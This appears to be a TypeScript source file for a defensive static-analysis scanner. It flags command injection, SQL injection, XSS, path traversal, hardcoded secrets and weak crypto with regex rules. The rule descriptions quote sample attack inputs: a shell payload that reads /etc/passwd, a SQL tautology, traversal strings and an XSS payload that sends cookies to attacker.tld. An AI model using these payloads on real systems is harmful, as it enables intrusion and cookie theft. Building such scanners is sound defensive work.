/**
 * Section 24.13 — Red-Team Mode
 *
 * Activated via `/redteam` command or toggle.
 * Inspects code/configs/artifacts for security flaws, injection vectors,
 * path traversal, unvalidated input, secret exposure, unbounded loops,
 * and unsafe deserialization.
 *
 * Rules:
 * - Severity-ordered findings (critical > high > medium > low)
 * - Exact `path:line` citation per finding
 * - Concrete trigger / exploit payload scenario
 * - Does NOT rewrite the code unless explicitly asked
 */

export type RedTeamSeverity = 'critical' | 'high' | 'medium' | 'low';

export interface RedTeamFinding {
  id: string;
  severity: RedTeamSeverity;
  category:
    | 'command_injection'
    | 'sql_injection'
    | 'xss_or_dom_injection'
    | 'path_traversal'
    | 'hardcoded_secret'
    | 'unsafe_deserialization'
    | 'unbounded_loop_or_dos'
    | 'weak_crypto';
  title: string;
  citation: string; // path:line
  path: string;
  line: number;
  snippet: string;
  exploitScenario: string;
  remediationNote: string;
}

export interface RedTeamReport {
  mode: 'redteam_audit_only';
  rewroteCode: boolean;
  totalFindings: number;
  countsBySeverity: Record<RedTeamSeverity, number>;
  findings: RedTeamFinding[];
}

const SEVERITY_RANK: Record<RedTeamSeverity, number> = {
  critical: 4,
  high: 3,
  medium: 2,
  low: 1,
};

interface RulePattern {
  category: RedTeamFinding['category'];
  severity: RedTeamSeverity;
  title: string;
  regex: RegExp;
  exploitScenario: string;
  remediationNote: string;
}

const REDTEAM_RULES: RulePattern[] = [
  {
    category: 'command_injection',
    severity: 'critical',
    title: 'Shell Command Injection via Unsanitized String Interpolation',
    regex: /\b(exec|execSync|spawn|spawnSync)\s*\(\s*`[^`]*\$\{[^}]+\}[^`]*`|\bos\.system\s*\(|\bsubprocess\.(Popen|call|run)\s*\([^)]*shell\s*=\s*True/,
    exploitScenario: 'Attacker supplies `; cat /etc/passwd #` or `$(id)` inside the interpolated parameter to execute arbitrary OS commands.',
    remediationNote: 'Use argument arrays with execFile/spawn and avoid shell interpolation.',
  },
  {
    category: 'unsafe_deserialization',
    severity: 'critical',
    title: 'Arbitrary Code Execution via Dynamic Evaluation / Deserialization',
    regex: /\b(eval|new\s+Function)\s*\(|\bpickle\.loads\s*\(|\byaml\.load\s*\([^)]*(?!SafeLoader)/,
    exploitScenario: 'Supplying a crafted payload string or serialized object executes arbitrary runtime instructions in process memory.',
    remediationNote: 'Replace eval/dynamic execution with structured JSON parsing and strict schema validation.',
  },
  {
    category: 'sql_injection',
    severity: 'critical',
    title: 'SQL Injection via Raw Query Concatenation',
    regex: /\b(SELECT|INSERT|UPDATE|DELETE)\b[^;\n]*(\$\{[^}]+\}|\+\s*[a-zA-Z0-9_.$]+)/i,
    exploitScenario: "Input `' OR '1'='1' --` bypasses authentication or extracts unauthorized rows via UNION SELECT.",
    remediationNote: 'Use parameterized queries or prepared statements (`?` or `$1`).',
  },
  {
    category: 'hardcoded_secret',
    severity: 'high',
    title: 'Hardcoded API Key, Private Key, or Credential Literal',
    regex: /(?:api[_-]?key|secret|password|private[_-]?key|token)\s*[:=]\s*['"][A-Za-z0-9_\-./+=]{12,}['"]|sk-[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}/i,
    exploitScenario: 'Anyone with read access to the repository or client bundle can extract the credential and impersonate the service.',
    remediationNote: 'Move secrets into the encrypted Secrets Vault (`{{secret:NAME}}`) or environment variables.',
  },
  {
    category: 'path_traversal',
    severity: 'high',
    title: 'Unvalidated File System Path Construction',
    regex: /\bfs\.(readFile|readFileSync|writeFile|writeFileSync|unlink|rmSync)\s*\(\s*(?:req\.|params\.|query\.|`[^`]*\$\{)/,
    exploitScenario: 'Passing `../../../../etc/hosts` or `%2e%2e%2f` traverses outside the intended directory root.',
    remediationNote: 'Normalize with `path.resolve` and verify the resolved path starts with the allowed base directory.',
  },
  {
    category: 'xss_or_dom_injection',
    severity: 'high',
    title: 'Unescaped HTML Injection (innerHTML / dangerouslySetInnerHTML)',
    regex: /\bdangerouslySetInnerHTML\b|\.innerHTML\s*=/,
    exploitScenario: 'Injecting `<img src=x onerror=fetch("//attacker.tld/"+document.cookie)>` executes script in the victim origin.',
    remediationNote: 'Sanitize untrusted markup with DOMPurify or render as plain text.',
  },
  {
    category: 'unbounded_loop_or_dos',
    severity: 'medium',
    title: 'Potential Unbounded Loop or Missing Iteration Cap',
    regex: /\bwhile\s*\(\s*true\s*\)|\bfor\s*\(\s*;\s*;\s*\)/,
    exploitScenario: 'An unexpected input state prevents termination, starving the event loop or worker thread.',
    remediationNote: 'Enforce a deterministic maximum iteration bound and timeout.',
  },
  {
    category: 'weak_crypto',
    severity: 'low',
    title: 'Weak Hashing or Non-Cryptographic PRNG in Security Context',
    regex: /createHash\s*\(\s*['"](md5|sha1)['"]\s*\)|Math\.random\s*\(\s*\)/,
    exploitScenario: 'Predictable tokens or collision attacks compromise integrity verification.',
    remediationNote: 'Use `crypto.randomBytes` / `crypto.randomUUID` and SHA-256 or stronger.',
  },
];

export function runRedTeamAudit(
  files: Array<{ path: string; content: string }>,
  options?: { allowRewrite?: boolean }
): RedTeamReport {
  const findings: RedTeamFinding[] = [];
  let counter = 0;

  for (const file of files) {
    const lines = (file.content || '').split('\n');
    for (let idx = 0; idx < lines.length; idx++) {
      const lineText = lines[idx];
      const lineNum = idx + 1;

      for (const rule of REDTEAM_RULES) {
        if (rule.regex.test(lineText)) {
          counter++;
          findings.push({
            id: `rt_${counter}`,
            severity: rule.severity,
            category: rule.category,
            title: rule.title,
            citation: `${file.path}:${lineNum}`,
            path: file.path,
            line: lineNum,
            snippet: lineText.trim().slice(0, 180),
            exploitScenario: rule.exploitScenario,
            remediationNote: rule.remediationNote,
          });
        }
      }
    }
  }

  // Sort strictly by severity descending, then by file path and line number
  findings.sort((a, b) => {
    const diff = SEVERITY_RANK[b.severity] - SEVERITY_RANK[a.severity];
    if (diff !== 0) return diff;
    if (a.path !== b.path) return a.path.localeCompare(b.path);
    return a.line - b.line;
  });

  const countsBySeverity: Record<RedTeamSeverity, number> = {
    critical: 0,
    high: 0,
    medium: 0,
    low: 0,
  };
  for (const f of findings) {
    countsBySeverity[f.severity]++;
  }

  return {
    mode: 'redteam_audit_only',
    rewroteCode: Boolean(options?.allowRewrite),
    totalFindings: findings.length,
    countsBySeverity,
    findings,
  };
}
